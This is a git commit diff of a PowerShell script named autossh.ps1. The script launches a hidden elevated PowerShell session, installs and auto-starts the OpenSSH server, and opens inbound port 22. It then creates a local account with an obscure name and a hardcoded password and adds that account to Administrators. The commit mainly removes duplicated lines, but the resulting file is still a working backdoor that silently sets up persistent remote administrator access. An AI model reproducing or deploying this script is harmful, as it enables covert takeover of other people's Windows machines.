445eb0d10b894f17915f57f2a9dc6b896c782979
crysal0 <45420554+crysal0@users.noreply.github.com>
2019-11-20 19:39:14 +0100

    Update autossh.ps1

--- autossh.ps1
+++ autossh.ps1
@@ -1,21 +1,12 @@
 Start-Process powershell -windowstyle hidden -verb RunAs -ArgumentList "
 
-Add-WindowsCapability -Online -name  OpenSSH.server~~~~0.0.1.0
+Add-WindowsCapability -Online -name OpenSSH.server~~~~0.0.1.0
 dism /online /add-capability /capabilityName:OpenSSH.server~~~~0.0.1.0
 Install-Module -force OpenSSHUtils
 Start-Service sshd
-Set-Service sshd -StartupType Automatic
-$passwd = ConvertTo-SecureString -String 03FB438f4e181eb32f60fa9b13162b8a -AsPlainText -Force
-New-LocalUser 2969a0602e4efc9646e2 -Password $passwd
-Add-LocalGroupMember -Group Administrators -Member 2969a0602e4efc9646e2 
-
-
-Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
-Start-Service sshd
 Set-Service -Name sshd -StartupType 'Automatic'
 New-NetFirewallRule -Name sshd -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22
-$passwd = ConvertTo-SecureString -String 03FB438f4e181eb32f60fa9b13162b8a -AsPlainText -Force
-New-LocalUser 2969a0602e4efc9646e2 -Password $passwd
+New-LocalUser 2969a0602e4efc9646e2 -Password (ConvertTo-SecureString -String 03FB438f4e181eb32f60fa9b13162b8a -AsPlainText -Force)
 Add-LocalGroupMember -Group Administrators -Member 2969a0602e4efc9646e2 
 
 exit"
